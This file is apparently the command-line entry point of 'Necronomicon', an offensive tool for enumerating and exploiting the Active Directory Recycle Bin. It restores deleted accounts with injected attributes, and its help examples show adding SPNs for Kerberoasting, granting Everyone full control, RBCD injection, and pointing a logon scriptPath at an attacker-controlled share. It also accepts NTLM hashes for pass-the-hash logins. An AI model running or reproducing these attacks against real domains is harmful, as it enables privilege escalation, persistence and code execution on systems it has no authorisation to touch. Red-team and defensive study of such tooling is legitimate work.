#!/usr/bin/env python3
"""
Necronomicon - AD Recycle Bin enumeration and exploitation tool.

Subcommands:
    enum-access  Enumerate who can access the Recycle Bin (low-privilege)
    enum-bin     Enumerate deleted objects in the Recycle Bin (requires access)
    inject       Restore a deleted object with injected attributes
"""

import sys
import logging
import argparse
import getpass
import json

from necronomicon.auth import Auth, AuthenticationError
from necronomicon.connection import LDAPSession
from necronomicon.enum_access import AccessEnumerator
from necronomicon.enum_bin import BinEnumerator, write_output
from necronomicon.inject import build_changes, run_inject


def add_common_args(parser):
    parser.add_argument('-d', '--domain', required=True,
                        help='Target AD domain (e.g. corp.local)')
    parser.add_argument('-u', '--username', required=True,
                        help='Username (user or user@domain)')
    parser.add_argument('-p', '--password', default=None,
                        help='Password (prompted if omitted)')
    parser.add_argument('-H', '--hashes', default=None,
                        help='NTLM hash (LMHASH:NTHASH or :NTHASH)')
    parser.add_argument('--aeskey', default='',
                        help='Kerberos AES key (128 or 256 bit hex)')
    parser.add_argument('-k', '--use-ccache', action='store_true',
                        help='Use Kerberos ccache (KRB5CCNAME)')
    parser.add_argument('-dc', '--dc', dest='dc', default=None,
                        help='Target DC hostname (auto-discovered if omitted)')
    parser.add_argument('-ns', '--nameserver', default=None,
                        help='DNS server to use')
    parser.add_argument('--auth-method', choices=('kerberos', 'ntlm'),
                        default='kerberos',
                        help='Authentication method (default: kerberos)')
    parser.add_argument('--ldaps', action='store_true',
                        help='Use LDAPS (port 636)')
    parser.add_argument('--channel-binding', action='store_true',
                        help='Use LDAP channel binding')
    parser.add_argument('--dns-tcp', action='store_true',
                        help='Use TCP for DNS queries')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')


def build_auth(args):
    password = args.password
    lm_hash = ''
    nt_hash = ''

    if args.hashes:
        parts = args.hashes.split(':')
        if len(parts) == 2:
            lm_hash = parts[0]
            nt_hash = parts[1]
        else:
            nt_hash = parts[0]

    if not password and not nt_hash and not args.aeskey and not args.use_ccache:
        password = getpass.getpass('Password: ')

    if password is None:
        password = ''

    return Auth(
        username=args.username,
        password=password,
        domain=args.domain,
        lm_hash=lm_hash,
        nt_hash=nt_hash,
        aeskey=args.aeskey,
        auth_method=args.auth_method,
        channel_binding=args.channel_binding,
    )


def build_session(args, auth):
    session = LDAPSession(
        domain=args.domain,
        auth=auth,
        nameserver=args.nameserver,
        dc=args.dc,
        use_ldaps=args.ldaps,
        dns_tcp=args.dns_tcp,
    )
    session.connect()
    return session


def cmd_enum_access(args):
    auth = build_auth(args)
    session = build_session(args, auth)
    enumerator = AccessEnumerator(session)
    findings = enumerator.enumerate()

    for finding in findings:
        if finding['category'] == 'recycle_bin_status':
            status = 'ENABLED' if finding['enabled'] else 'NOT ENABLED'
            print('\n[*] AD Recycle Bin: %s' % status)
            if finding['tombstone_lifetime']:
                print('    Tombstone lifetime: %s days' % finding['tombstone_lifetime'])
            if finding['deleted_object_lifetime']:
                print('    Deleted object lifetime: %s days' % finding['deleted_object_lifetime'])

        elif finding['category'] == 'reanimate_tombstones':
            print('\n[*] Reanimate Tombstones right (can restore deleted objects):')
            if not finding['principals']:
                print('    No explicit grants found (only default Domain Admins)')
            for p in finding['principals']:
                print('    %s  %-8s  [%s]  %s' % (
                    p['ace_type'], p['scope'], p['sid'], p['name']))

        elif finding['category'] == 'deleted_objects_access':
            print('\n[*] Deleted Objects container access (can enumerate recycle bin):')
            if not finding['principals']:
                print('    Could not read container SD (access denied)')
            for p in finding['principals']:
                right = p.get('right', '')
                ace_type = p.get('ace_type', '')
                label = '%s %s' % (ace_type, right) if ace_type else right
                print('    %-20s  [%s]  %s' % (label, p['sid'], p['name']))

    print()

    if args.output:
        with open(args.output, 'w') as fh:
            json.dump(findings, fh, indent=2, default=str)
        print('[*] JSON output written to %s' % args.output)


def _print_object_table(objects, cap=None):
    display = objects[:cap] if cap else objects
    print('    %-30s %-12s %-20s %s' % ('Name', 'Class', 'SAMAccountName', 'Last Parent'))
    print('    ' + '-' * 90)
    for obj in display:
        print('    %-30s %-12s %-20s %s' % (
            obj['name'] or '',
            obj['objectclass'] or '',
            obj['samaccountname'] or '',
            obj['lastknownparent'] or '',
        ))
        if obj.get('description'):
            print('      description: %s' % obj['description'])
        if obj.get('info'):
            print('      info:        %s' % obj['info'])
    if cap and len(objects) > cap:
        print('    ... and %d more (see JSON output)' % (len(objects) - cap))


def cmd_enum_bin(args):
    auth = build_auth(args)
    session = build_session(args, auth)
    enumerator = BinEnumerator(session)
    result = enumerator.enumerate()

    meta = result['meta']
    if meta['total'] == 0:
        print('\n[!] No deleted objects found.')
        return

    print('\n[*] Deleted objects: %d total, %d restorable, %d recycled' % (
        meta['total'], meta['restorable'], meta['recycled']))

    for obj_type, objects in sorted(result['restorable'].items()):
        print('\n[+] Restorable %s (%d):' % (obj_type, len(objects)))
        _print_object_table(objects)

    for obj_type, objects in sorted(result['recycled'].items()):
        print('\n[-] Recycled %s (%d):' % (obj_type, len(objects)))
        _print_object_table(objects, cap=10)

    if result.get('high_value'):
        print('\n[!] High-value targets:')
        for obj in result['high_value']:
            tags = ', '.join(obj.get('value_tags', []))
            print('    %s (%s) [%s]' % (obj['name'] or '', obj['objectclass'] or '', tags))
            print('      guid: %s' % obj.get('objectguid', ''))

    if result['notable']:
        print('\n[!] Objects with description/info fields:')
        for obj in result['notable']:
            status = 'restorable' if obj['restorable'] else 'recycled'
            print('    [%s] %s (%s)' % (status, obj['name'] or '', obj['objectclass'] or ''))
            if obj.get('description'):
                print('      description: %s' % obj['description'])
            if obj.get('info'):
                print('      info:        %s' % obj['info'])

    print()

    outfile = args.output or 'deleted_objects.json'
    write_output(result, outfile)


def cmd_inject(args):
    if not args.target:
        logging.error('--target is required')
        return 1

    has_changes = (args.set_attr or args.add_attr or args.del_attr or
                   args.sd_everyone or args.sd_principal or args.sd_rbcd)
    if not has_changes:
        logging.error('No attributes to inject. Use --set, --add, --del, '
                      '--sd-everyone, --sd-principal, or --sd-rbcd')
        return 1

    auth = build_auth(args)
    session = build_session(args, auth)

    try:
        changes = build_changes(
            set_attrs=args.set_attr,
            add_attrs=args.add_attr,
            del_attrs=args.del_attr,
            sd_everyone=args.sd_everyone,
            sd_principal=args.sd_principal,
            sd_rbcd=args.sd_rbcd,
        )
    except ValueError as e:
        logging.error('%s', e)
        return 1

    ok = run_inject(session, args.target, changes,
                    target_ou=args.target_ou,
                    new_name=args.restore_name)
    return 0 if ok else 1


INJECT_EXAMPLES = """
examples:
  # Restore with arbitrary attributes
  necronomicon inject -d corp.local -u admin -k --target victim \\
    --set userAccountControl=544 --set pwdLastSet=0

  # Add an SPN for Kerberoasting
  necronomicon inject -d corp.local -u admin -k --target victim \\
    --add servicePrincipalName=MSSQLSvc/db.corp.local:1433

  # Inject Everyone:FullControl DACL
  necronomicon inject -d corp.local -u admin -k --target victim \\
    --sd-everyone

  # RBCD injection (builds the binary SD automatically)
  necronomicon inject -d corp.local -u admin -k --target comp$ \\
    --sd-rbcd S-1-5-21-...-1234

  # Restore into a specific OU with a new name
  necronomicon inject -d corp.local -u admin -k --target victim \\
    --set scriptPath='\\\\attacker\\share\\run.bat' \\
    --target-ou 'OU=Servers,DC=corp,DC=local' --restore-name svc_backup

  # Combine multiple injections in one restore
  necronomicon inject -d corp.local -u admin -k --target victim \\
    --set userAccountControl=528384 \\
    --add servicePrincipalName=HTTP/web.corp.local \\
    --sd-everyone
"""


def main():
    parser = argparse.ArgumentParser(
        description='Necronomicon - AD Recycle Bin enumeration and exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter)
    subparsers = parser.add_subparsers(dest='command', help='Command to run')

    # ── enum-access ──
    p_access = subparsers.add_parser('enum-access',
        help='Enumerate who can access the Recycle Bin (low-privilege)')
    add_common_args(p_access)
    p_access.add_argument('-o', '--output', default=None,
                          help='Write JSON output to file')

    # ── enum-bin ──
    p_bin = subparsers.add_parser('enum-bin',
        help='Enumerate deleted objects in the Recycle Bin')
    add_common_args(p_bin)
    p_bin.add_argument('-o', '--output', default=None,
                       help='Output file (default: deleted_objects.json)')

    # ── inject ──
    p_inject = subparsers.add_parser('inject',
        help='Restore a deleted object with injected attributes',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=INJECT_EXAMPLES)
    add_common_args(p_inject)
    p_inject.add_argument('--target', required=True,
                          help='Deleted object to target (GUID, SID, sAMAccountName, or name)')
    p_inject.add_argument('--target-ou', default=None,
                          help='Override restore location (target OU DN)')
    p_inject.add_argument('--restore-name', default=None,
                          help='Override restored object RDN')

    # Generic attribute injection
    p_inject.add_argument('--set', dest='set_attr', action='append', metavar='ATTR=VALUE',
                          help='Set attribute (MODIFY_REPLACE). Repeatable.')
    p_inject.add_argument('--add', dest='add_attr', action='append', metavar='ATTR=VALUE',
                          help='Add attribute value (MODIFY_ADD). Repeatable.')
    p_inject.add_argument('--del', dest='del_attr', action='append', metavar='ATTR',
                          help='Delete attribute (MODIFY_DELETE). Repeatable.')

    # SD convenience flags (binary SDs are not hand-constructible)
    sd_group = p_inject.add_argument_group('security descriptor helpers',
        'Convenience flags for binary SD construction')
    sd_group.add_argument('--sd-everyone', action='store_true',
                          help='Set nTSecurityDescriptor to Everyone:FullControl')
    sd_group.add_argument('--sd-principal', metavar='SID',
                          help='Set nTSecurityDescriptor granting FullControl to SID')
    sd_group.add_argument('--sd-rbcd', metavar='SID',
                          help='Set msDS-AllowedToActOnBehalfOfOtherIdentity '
                               'with RBCD SD for SID')

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        return 1

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format='%(levelname)s: %(message)s')

    try:
        if args.command == 'enum-access':
            cmd_enum_access(args)
        elif args.command == 'enum-bin':
            cmd_enum_bin(args)
        elif args.command == 'inject':
            return cmd_inject(args)
    except AuthenticationError as e:
        logging.error('Authentication failed: %s', e)
        return 1
    except ConnectionError as e:
        logging.error('Connection failed: %s', e)
        return 1
    except KeyboardInterrupt:
        logging.info('Interrupted')
        return 130

    return 0


if __name__ == '__main__':
    sys.exit(main())
